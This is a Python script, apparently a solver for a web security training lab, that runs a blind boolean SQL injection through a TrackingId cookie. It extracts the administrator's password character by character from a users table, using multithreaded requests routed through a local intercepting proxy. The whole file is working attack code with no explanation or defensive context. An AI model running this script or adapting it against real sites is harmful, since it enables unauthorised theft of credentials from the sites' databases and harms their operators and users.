import sys
import requests
import string
import urllib3
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

SESSION_COOKIE = "nVv9ss2PgSytL7GtOi6D48ErNIcpQeAY"
TRACKING_PREFIX = "LCmPwM5sbGgGTWHz"
SUCCESS_MARKER = "Welcome back!"

# -------- single request worker --------
def test_char(url, position, char):
    payload = (
        f"' AND SUBSTRING((SELECT password FROM users "
        f"WHERE username='administrator'),{position},1)='{char}'-- "
    )
    encoded_payload = urllib.parse.quote(payload)

    cookies = {
        "TrackingId": TRACKING_PREFIX + encoded_payload,
        "session": SESSION_COOKIE,
    }

    r = requests.get(
        url,
        cookies=cookies,
        verify=False,
        proxies=proxies,
        headers={"Connection": "close"},  # avoid protocol reuse
        timeout=10,
    )

    if SUCCESS_MARKER in r.text:
        return char

    return None


# -------- main extraction logic --------
def sqli_password(url):
    password = ""

    charset = [chr(i) for i in range(32, 127)]

    for position in range(1, 21):
        found_char = None

        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {
                executor.submit(test_char, url, position, c): c
                for c in charset
            }

            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_char = result
                    password += result
                    print(f"[+] Position {position}: {result}")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

        if not found_char:
            print(f"[-] No character found at position {position}")
            break

    print(f"\n[✓] Extracted password: {password}")


def main():
    if len(sys.argv) != 2:
        print("Usage: python3 solver_script.py <url>")
        sys.exit(1)

    print("[*] Retrieving password for user administrator...")
    sqli_password(sys.argv[1])


if __name__ == "__main__":
    main()
